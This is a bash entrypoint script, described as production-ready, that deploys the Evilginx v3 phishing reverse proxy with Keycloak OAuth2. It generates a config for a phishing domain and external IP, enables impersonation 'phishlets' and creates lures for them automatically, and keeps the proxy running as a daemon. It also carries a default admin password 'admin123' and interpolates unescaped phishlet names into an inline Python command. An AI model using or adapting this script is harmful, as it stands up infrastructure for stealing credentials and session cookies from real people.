#!/bin/bash
# evilginx-entrypoint.sh - Production entrypoint for Evilginx v3 with Keycloak integration
# Runs Evilginx v3 as a daemon with Keycloak OAuth2 integration

set -euo pipefail

CONFIG_DIR="${EVILGINX_CONFIG_DIR:-/config}"
PHISHLETS_DIR="${EVILGINX_PHISHLETS_DIR:-/config/phishlets}"
CERTS_DIR="${EVILGINX_CERTS_DIR:-/config/certs}"
LOG_FILE="${EVILGINX_LOG_FILE:-/config/logs/evilginx.log}"

EVILGINX_BIN="/usr/local/bin/evilginx"

# Keycloak configuration
KEYCLOAK_URL="${KEYCLOAK_URL:-http://localhost:8080}"
KEYCLOAK_REALM="${KEYCLOAK_REALM:-evilginx}"
KEYCLOAK_ADMIN="${KEYCLOAK_ADMIN:-admin}"
KEYCLOAK_ADMIN_PASSWORD="${KEYCLOAK_ADMIN_PASSWORD:-admin123}"
KEYCLOAK_CLIENT_ID="${KEYCLOAK_CLIENT_ID:-evilginx-proxy}"
KEYCLOAK_CLIENT_SECRET="${KEYCLOAK_CLIENT_SECRET:-}"
KEYCLOAK_CLIENT_SECRET_FILE="${KEYCLOAK_CLIENT_SECRET_FILE:-/run/secrets/keycloak_client_secret}"

mkdir -p "${CONFIG_DIR}" "${PHISHLETS_DIR}" "${CERTS_DIR}" "$(dirname "${LOG_FILE}")" "${CERTS_DIR}/certmagic"

# Read client secret from file if exists
if [ -f "${KEYCLOAK_CLIENT_SECRET_FILE}" ]; then
    KEYCLOAK_CLIENT_SECRET=$(cat "${KEYCLOAK_CLIENT_SECRET_FILE}" | tr -d '\n\r')
fi

# Generate config.json from environment variables if not exists
if [ ! -f "${CONFIG_DIR}/config.json" ]; then
    cat > "${CONFIG_DIR}/config.json" <<EOF
{
  "general": {
    "bind_ipv4": "${EVILGINX_BIND_IPV4:-0.0.0.0}",
    "dns_port": ${EVILGINX_DNS_PORT:-53},
    "domain": "${EVILGINX_DOMAIN:-}",
    "external_ipv4": "${EVILGINX_EXTERNAL_IPV4:-}",
    "https_port": ${EVILGINX_HTTPS_PORT:-443},
    "unauth_url": "${EVILGINX_UNAUTH_URL:-https://www.youtube.com/watch?v=dQw4w9WgXcQ}"
  },
  "phishlets": {},
  "lures": []
}
EOF
fi

# Enable phishlets from environment variable
if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
    IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
    for phishlet in "${PHISHLETS[@]}"; do
        phishlet=$(echo "$phishlet" | xargs)
        if [ -n "$phishlet" ]; then
            python3 -c "
import json
with open('${CONFIG_DIR}/config.json', 'r') as f:
    config = json.load(f)
config['phishlets']['${phishlet}'] = {
    'hostname': '${phishlet}.${EVILGINX_DOMAIN:-}',
    'enabled': True,
    'visible': True
}
with open('${CONFIG_DIR}/config.json', 'w') as f:
    json.dump(config, f, indent=2)
"
        fi
    done
fi

# Function to wait for Keycloak
wait_for_keycloak() {
    echo "Waiting for Keycloak to be ready..."
    local max_attempts=30
    local attempt=0
    while [ $attempt -lt $max_attempts ]; do
        if curl -s -f "${KEYCLOAK_URL}/health/ready" >/dev/null 2>&1; then
            echo "Keycloak is ready"
            return 0
        fi
        attempt=$((attempt + 1))
        echo "Waiting for Keycloak... (attempt $attempt/$max_attempts)"
        sleep 5
    done
    echo "WARNING: Keycloak not ready after $max_attempts attempts, continuing without Keycloak integration"
    return 1
}

# Wait for Keycloak
echo "Checking Keycloak availability..."
wait_for_keycloak
KEYCLOAK_READY=$?

if [ ${KEYCLOAK_READY} -eq 0 ]; then
    echo "Keycloak is available - phishlets will use Keycloak OAuth2"
    
    # Verify phishlet OAuth2 configs
    if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
        IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
        for phishlet in "${PHISHLETS[@]}"; do
            phishlet=$(echo "$phishlet" | xargs)
            if [ -n "$phishlet" ]; then
                # Check if phishlet YAML has OAuth2 config
                if grep -q "oauth2:" "${PHISHLETS_DIR}/${phishlet}.yaml" 2>/dev/null; then
                    echo "✓ ${phishlet}: OAuth2 config found in YAML"
                else
                    echo "WARNING: ${phishlet} missing OAuth2 config in YAML"
                fi
            fi
        done
    fi
else
    echo "Keycloak not available, running without Keycloak integration"
fi

export CERTMAGIC_STORAGE="${CERTS_DIR}/certmagic"

CMD_ARGS=("-c" "${CONFIG_DIR}" "-p" "${PHISHLETS_DIR}" "-certmagic.storage" "${CERTMAGIC_STORAGE}")

if [ "${EVILGINX_DEVELOPER:-false}" = "true" ]; then
    CMD_ARGS+=("-developer")
fi

if [ "${EVILGINX_DEBUG:-false}" = "true" ]; then
    CMD_ARGS+=("-debug")
fi

echo "Starting Evilginx..."
echo "Config: ${CONFIG_DIR}/config.json"
echo "Domain: ${EVILGINX_DOMAIN:-<not set>}"
echo "External IP: ${EVILGINX_EXTERNAL_IPV4:-<not set>}"

# Build commands to send to Evilginx stdin
COMMANDS=""

if [ -n "${EVILGINX_DOMAIN:-}" ]; then
    COMMANDS="${COMMANDS}config domain ${EVILGINX_DOMAIN}\n"
fi

if [ -n "${EVILGINX_EXTERNAL_IPV4:-}" ]; then
    COMMANDS="${COMMANDS}config ipv4 external ${EVILGINX_EXTERNAL_IPV4}\n"
fi

if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
    IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
    for phishlet in "${PHISHLETS[@]}"; do
        phishlet=$(echo "$phishlet" | xargs)
        if [ -n "$phishlet" ]; then
            COMMANDS="${COMMANDS}phishlets hostname ${phishlet} ${phishlet}.${EVILGINX_DOMAIN:-}\n"
            COMMANDS="${COMMANDS}phishlets enable ${phishlet}\n"
        fi
    done
fi

if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
    IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
    for phishlet in "${PHISHLETS[@]}"; do
        phishlet=$(echo "$phishlet" | xargs)
        if [ -n "$phishlet" ]; then
            COMMANDS="${COMMANDS}lures create ${phishlet}\n"
        fi
    done
fi

echo "Starting Evilginx..."
echo "Config: ${CONFIG_DIR}/config.json"
echo "Domain: ${EVILGINX_DOMAIN:-<not set>}"
echo "External IP: ${EVILGINX_EXTERNAL_IPV4:-<not set>}"

PIPE="/tmp/evilginx_stdin"
rm -f "$PIPE"
mkfifo "$PIPE"

cat "$PIPE" | "${EVILGINX_BIN}" "${CMD_ARGS[@]}" >> "${LOG_FILE}" 2>&1 &
EVILGINX_PID=$!

echo "${EVILGINX_PID}" > /tmp/evilginx.pid
echo "Evilginx started with PID: ${EVILGINX_PID}"

(
    if [ -n "${EVILGINX_DOMAIN:-}" ]; then
        echo -e "config domain ${EVILGINX_DOMAIN}"
    fi

    if [ -n "${EVILGINX_EXTERNAL_IPV4:-}" ]; then
        echo -e "config ipv4 external ${EVILGINX_EXTERNAL_IPV4}"
    fi

    if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
        IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
        for phishlet in "${PHISHLETS[@]}"; do
            phishlet=$(echo "$phishlet" | xargs)
            if [ -n "$phishlet" ]; then
                echo -e "phishlets hostname ${phishlet} ${phishlet}.${EVILGINX_DOMAIN:-}"
                echo -e "phishlets enable ${phishlet}"
            fi
        done
    fi

    if [ -n "${EVILGINX_ENABLE_PHISHLETS:-}" ]; then
        IFS=',' read -ra PHISHLETS <<< "${EVILGINX_ENABLE_PHISHLETS}"
        for phishlet in "${PHISHLETS[@]}"; do
            phishlet=$(echo "$phishlet" | xargs)
            if [ -n "$phishlet" ]; then
                echo -e "lures create ${phishlet}"
            fi
        done
    fi

    while true; do
        sleep 30
        echo ""
    done
) > "$PIPE" &
COMMAND_PID=$!

echo "Evilginx started with PID: ${EVILGINX_PID}"
sleep 5

if ! kill -0 "${EVILGINX_PID}" 2>/dev/null; then
    echo "ERROR: Evilginx died during startup"
    cat "${LOG_FILE}"
    exit 1
fi

echo "Evilginx running. Tailing logs..."
tail -f "${LOG_FILE}" &
TAIL_PID=$!

trap 'echo "Shutting down..."; kill "${EVILGINX_PID}" 2>/dev/null; kill "${COMMAND_PID}" 2>/dev/null; kill "${TAIL_PID}" 2>/dev/null; rm -f "$PIPE"; exit 0' SIGTERM SIGINT

wait "${EVILGINX_PID}"
EVILGINX_EXIT=$?

kill "${COMMAND_PID}" 2>/dev/null || true
kill "${TAIL_PID}" 2>/dev/null || true
rm -f "$PIPE"

echo "Evilginx exited with code: ${EVILGINX_EXIT}"
exit "${EVILGINX_EXIT}"